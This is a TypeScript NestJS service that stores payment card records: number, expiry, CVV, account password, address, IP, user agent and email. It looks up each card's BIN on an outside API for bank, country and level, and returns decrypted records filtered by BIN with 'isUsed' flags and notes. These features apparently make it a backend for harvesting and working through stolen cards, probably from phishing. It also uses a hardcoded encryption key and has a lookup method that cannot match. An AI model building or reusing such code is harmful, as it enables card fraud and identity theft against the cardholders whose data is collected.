import { Injectable } from "@nestjs/common";
import { InjectModel } from "@nestjs/mongoose";
import { Model } from "mongoose";
import * as crypto from 'crypto';
import { ccDTO } from "./dto/cc.dto";
import { Cc } from "src/schema/Cc.schema";

@Injectable()
export class InformationService {
    private readonly algorithm = 'aes-256-cbc';
    private readonly secrect_key = 'fd85b494-aaaa';
    private readonly secrect_iv = 'smslt';
    private readonly key = crypto.createHash('sha256').update(this.secrect_key, 'utf8').digest();
    private readonly iv = Buffer.from(this.secrect_iv, 'utf8');

    constructor(@InjectModel(Cc.name) private ccModel: Model<Cc>) { }

    private encrypt(text: string): string {
        if (!text) {
            return text;
        }
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return `${iv.toString('hex')}:${encrypted}`;
    }
    
    private decrypt(text: string): string {
        if (!text) return text;
        try {
            const [ivHex, encryptedText] = text.split(':');
            const iv = Buffer.from(ivHex, 'hex');
            const decipher = crypto.createDecipheriv(this.algorithm, this.key, iv);
            let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
            decrypted += decipher.final('utf8');
            return decrypted;
        } catch (error) {
            console.error(`Decryption error: ${error.message}`);
            return null; // or handle appropriately
        }
    }
    
    async uploadInformation(ccDTO: ccDTO) {
        const bin = ccDTO.ccnum.slice(0, 6);
        const response = await fetch(`https://api.shuniji.io/api/bincheck?bin=${bin}`);
        const data = await response.json();

        ccDTO.ccnum = this.encrypt(ccDTO.ccnum);
        ccDTO.month = this.encrypt(ccDTO.month);
        ccDTO.year = this.encrypt(ccDTO.year);
        ccDTO.cvv = this.encrypt(ccDTO.cvv);
        ccDTO.password = this.encrypt(ccDTO.password);
        ccDTO.address = this.encrypt(ccDTO.address);
        ccDTO.address2 = this.encrypt(ccDTO.address2);
        ccDTO.ip = this.encrypt(ccDTO.ip);
        ccDTO.userAgent = this.encrypt(ccDTO.userAgent);
        ccDTO.email = this.encrypt(ccDTO.email);
        
        const cc = new this.ccModel(ccDTO);
        cc.createDate = new Date(Date.now());
        cc.note = '';
        cc.isUsed = false;
        cc.bin = bin;
        cc.total_bin = data.bins_data[0].total_bins;
        cc.country = data.bins_data[0].Country;
        cc.bank = data.bins_data[0].Bank;
        cc.level = data.bins_data[0].Level;
        return cc.save();
    }

    async getInformation() {
        const data = await this.ccModel.find();
        return data.map(item => {
            item.ccnum = this.decrypt(item.ccnum);
            item.month = this.decrypt(item.month);
            item.year = this.decrypt(item.year);
            item.cvv = this.decrypt(item.cvv);
            item.password = this.decrypt(item.password);
            item.address = this.decrypt(item.address);
            item.address2 = this.decrypt(item.address2);
            item.ip = this.decrypt(item.ip);
            item.userAgent = this.decrypt(item.userAgent);
            item.email = this.decrypt(item.email);
            return item;
        });
    }

    async getInfoByCCNum(ccnum: string) {
        const encryptedCCNum = this.encrypt(ccnum);
        const data = await this.ccModel.findOne({ ccnum: encryptedCCNum });
        if (data) {
            data.ccnum = this.decrypt(data.ccnum);
        }
        return data;
    }
    async getInfoByBin(bin: string) {
        const data = await this.ccModel.find({ bin: bin });
        return data.map(item => {
            item.ccnum = this.decrypt(item.ccnum);
            item.month = this.decrypt(item.month);
            item.year = this.decrypt(item.year);
            item.cvv = this.decrypt(item.cvv);
            item.password = this.decrypt(item.password);
            item.address = this.decrypt(item.address);
            item.address2 = this.decrypt(item.address2);
            item.ip = this.decrypt(item.ip);
            item.userAgent = this.decrypt(item.userAgent);
            item.email = this.decrypt(item.email);
            return item;
        });
    }
    async getInfoByListBin(listBin: string[]) {
        const data = await this.ccModel.find({ bin: { $in: listBin } });
        return data.map(item => {
            item.ccnum = this.decrypt(item.ccnum);
            item.month = this.decrypt(item.month);
            item.year = this.decrypt(item.year);
            item.cvv = this.decrypt(item.cvv);
            item.password = this.decrypt(item.password);
            item.address = this.decrypt(item.address);
            item.address2 = this.decrypt(item.address2);
            item.ip = this.decrypt(item.ip);
            item.userAgent = this.decrypt(item.userAgent);
            item.email = this.decrypt(item.email);
            return item;
        });
    }
    async updateNoteById(id: string, note: string) {
        return this.ccModel.updateOne({ _id: id }, { note: note });
    }
    async updateIsUsedById(id: string, isUsed: boolean) {
        return this.ccModel.updateOne({ _id: id }, { isUsed: isUsed });
    }
}
